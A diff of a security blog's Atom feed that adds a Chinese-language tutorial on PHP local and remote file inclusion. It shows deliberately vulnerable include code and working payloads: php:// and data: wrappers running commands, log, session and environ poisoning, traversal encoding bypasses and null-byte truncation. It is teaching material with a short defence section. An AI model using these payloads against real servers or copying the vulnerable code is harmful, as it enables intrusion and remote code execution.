@@ -209,20 +209,6 @@
   </entry>
   
   <entry>
-    <title>Dedecms v5.7SP2(20180109) 近期漏洞盘点</title>
-    <link href="http://chybeta.github.io/2018/01/29/Dedecms-v5-7SP2-20180109-%E8%BF%91%E6%9C%9F%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9/"/>
-    <id>http://chybeta.github.io/2018/01/29/Dedecms-v5-7SP2-20180109-近期漏洞盘点/</id>
-    <published>2018-01-29T15:34:48.000Z</published>
-    <updated>2018-01-29T15:34:48.108Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>AceBear Security Contest-部分Web-writeup</title>
     <link href="http://chybeta.github.io/2018/01/29/AceBear-Security-Contest-%E9%83%A8%E5%88%86Web-writeup/"/>
     <id>http://chybeta.github.io/2018/01/29/AceBear-Security-Contest-部分Web-writeup/</id>
@@ -1371,6 +1357,244 @@
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>php文件包含漏洞</title>
+    <link href="http://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://chybeta.github.io/2017/10/08/php文件包含漏洞/</id>
+    <published>2017-10-08T15:49:30.000Z</published>
+    <updated>2017-11-10T12:37:08.037Z</updated>
+    
+    <content type="html"><![CDATA[<p>php文件包含漏洞学习<br>合上吧，没有新姿势。<br><a id="more"></a></p>
+<h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ol>
+<li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a></li>
+<li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a></li>
+<li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a></li>
+<li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a></li>
+</ol>
+<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/1.png?raw=true" alt=""></p>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/2.png?raw=true" alt=""></p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt</div></pre></td></tr></table></figure></p>
+<p>即可成功解析phpinfo。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/3.png?raw=true" alt=""></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ol>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
+</ol>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/4.png?raw=true" alt=""></p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</p>
+<p>若有特殊要求，会在利用条件里指出。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">index.php</div><div class="line">?file=php://input</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;? phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/5.png?raw=true" alt=""></p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：无甚</p>
+<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/8.png?raw=true" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">"PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg=="</span>)</div><div class="line"><span class="string">b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;"</span></div></pre></td></tr></table></figure>
+<p>其他姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
+<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：</p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/9.png?raw=true" alt=""></p>
+<p>指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
+<p>或者使用相对路径（这里test.zip就在当前目录下）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/10.png?raw=true" alt=""></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：<br>构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/11.png?raw=true" alt=""></p>
+<p>若是使用相对路径，则会包含失败。</p>
+<h3 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h3><p>利用条件：</p>
+<ol>
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/6.png?raw=true" alt=""></p>
+<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</div></pre></td></tr></table></figure></p>
+<p>姿势二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</div></pre></td></tr></table></figure></p>
+<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/7.png?raw=true" alt=""></p>
+<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</div></pre></td></tr></table></figure></p>
+<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt=""></p>
+<p>常见的php-session存放位置：</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ol>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/16.png?raw=true" alt=""></p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="external">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
+<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>姿势：</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/12.png?raw=true" alt=""></p>
+<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/13.png?raw=true" alt=""></p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup </a></p>
+<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：</p>
+<p>用ssh连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</div></pre></td></tr></table></figure></p>
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" alt=""></p>
+<p>之后进行文件包含即可。</p>
+<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="external">RCE with LFI and SSH Log Poisoning</a></p>
+<h2 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h2><p>利用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>姿势：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p>可以参考这个：</p>
+<ol>
+<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="external">The proc/self/environ Injection </a></li>
+<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="external">shell via LFI - proc/self/environ method</a></li>
+</ol>
+<h2 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h2><p>跟包含environ类似。</p>
+<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="external">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
+<h2 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h2><p><img src="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" alt=""></p>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">LFI With PHPInfo Assistance</a></p>
+<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></p>
+<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
+<p>姿势：</p>
+<p>往往要配合上传的姿势，不说了，太多了。</p>
+<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
+<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这样就很“难”直接去包含前面提到的种种文件。</p>
+<h2 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h2><p>先考虑一下指定了前缀的情况吧。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
+<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include.php?file=../../log/test.txt</div></pre></td></tr></table></figure></p>
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt=""></p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/  </li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li>../<ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器/服务器的编码方式<ul>
+<li>../<ul>
+<li>..%c0%af<ul>
+<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="external">Why does Directory traversal attack %C0%AF work?</a></li>
+</ul>
+</li>
+<li>%c0%ae%c0%ae/<ul>
+<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</div></pre></td></tr></table></figure></p>
+<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
+<p>姿势一：query（？）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</div></pre></td></tr></table></figure></p>
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt=""></p>
+<p>姿势二：fragment（#）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=http://remoteaddr/remoteinfo.txt%23</div></pre></td></tr></table></figure></p>
+<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="external">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt=""></p>
+<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>构造压缩包如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt=""></p>
+<p>其中test.php内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure></p>
+<p>利用zip协议，注意要指定绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</div></pre></td></tr></table></figure></p>
+<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt=""></p>
+<p>能成功包含。</p>
+<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt=""></p>
+<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=././././。。。省略。。。././shell.txt</div></pre></td></tr></table></figure></p>
+<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt%00</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt=""></p>
+<p>能利用00截断的场景现在应该很少了：）</p>
+<h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
+<li>做好文件的权限管理</li>
+<li>对危险字符进行过滤等等</li>
+</ol>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li>《白帽子讲Web安全》</li>
+<li><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" target="_blank" rel="external">From LFI to RCE in php </a></li>
+<li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">l3m0n: 文件包含漏洞小结</a></li>
+<li><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" rel="external">LFI Cheat Sheet</a></li>
+<li><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="external">Local File Inclusion</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;php文件包含漏洞学习&lt;br&gt;合上吧，没有新姿势。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="文件包含" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+      <category term="伪协议" scheme="http://chybeta.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
     
   </entry>
   
